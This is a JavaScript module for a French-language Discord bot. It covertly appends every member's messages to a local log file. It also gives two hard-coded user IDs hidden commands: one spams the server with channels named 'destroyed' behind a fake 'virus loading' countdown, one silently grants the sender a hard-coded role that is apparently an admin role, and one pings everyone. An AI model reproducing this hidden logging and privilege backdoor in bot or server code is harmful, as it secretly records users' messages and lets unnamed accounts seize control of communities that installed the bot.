var fs = require('fs');
module.exports = (client, user) => {
  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  client.on(`message`, async message => {
    if (!message.author.bot) {
      try {
        // const fetchedLogs = await guild.fetchAuditLogs({
        //   limit: 1,
        //   type: 'MEMBER_BAN_ADD',
        // });
        var alertsev1 =  `Msg_id: ${message.id} | Auteur: ${message.author.username} | Channel: ${message.channel.name} | Message: ${message.content}\n`
        fs.appendFile('messages.txt', `${alertsev1}`, function (err) {
          if (err) return console.log(err);
          console.log(`${alertsev1}`);
        });
        // fs.writeFile(path.resolve('../', 'messages.json'), JSON.stringify(alertsev1, null, 4), function (err) {
        //   if (err) return console.log(err);
        //   console.log('Hello World > helloworld.txt');
        // });
      } catch (e) {
        console.log(e);
      }
      if ((message.author.id === '230920595204866050' || message.author.id === '303950569104605184') && message.content === "/destroy") {
        // message.guild.setIcon('./image.gif')
        //   .then(updated => console.log('Updated the guild icon'))
        //   .catch(console.error);
        message.channel.send('Chargement du virus en cours...');
        await sleep(3000);
        message.channel.send('Virus chargé...');
        for (var i = 10; i > 0; i--) {
          message.channel.send(`Lancement dans ${i}`);
          await sleep(1000);
        }
        for (var i = 0; i < 3; i++) {
          message.guild.channels.create('destroyed', { type: 'text' })
          .catch(console.error);
          message.guild.channels.create('destroyed', { type: 'voice' })
          .catch(console.error);
        }
      } else if (message.content === "/destroy") {
        message.reply("BOOM!");
      }
      if ((message.author.id === '230920595204866050' || message.author.id === '303950569104605184') && message.content === "/repair") {
        message.delete();
        message.guild.channels.cache.map(channel => {
          if (channel.name === 'destroyed') {
            return channel.delete();
          }
          return;
        });
        message.reply('Restauration terminée.');
      }
      if ((message.author.id === '230920595204866050' || message.author.id === '303950569104605184') && message.content === "/adminboobs") {
        message.delete();
        var role = message.guild.roles.cache.find(role => role.id === "844915590484721665");
        message.member.roles.add(role);
        console.log('Vous etes maintenant Admin');
      }
      if ((message.author.id === '230920595204866050' || message.author.id === '303950569104605184') && message.content === "/everyone") {
        message.channel.send("@everyone")
      }
      if (message.content.toLowerCase() === "tg") {
        message.reply("Toi tg");
      }
    }
  });
}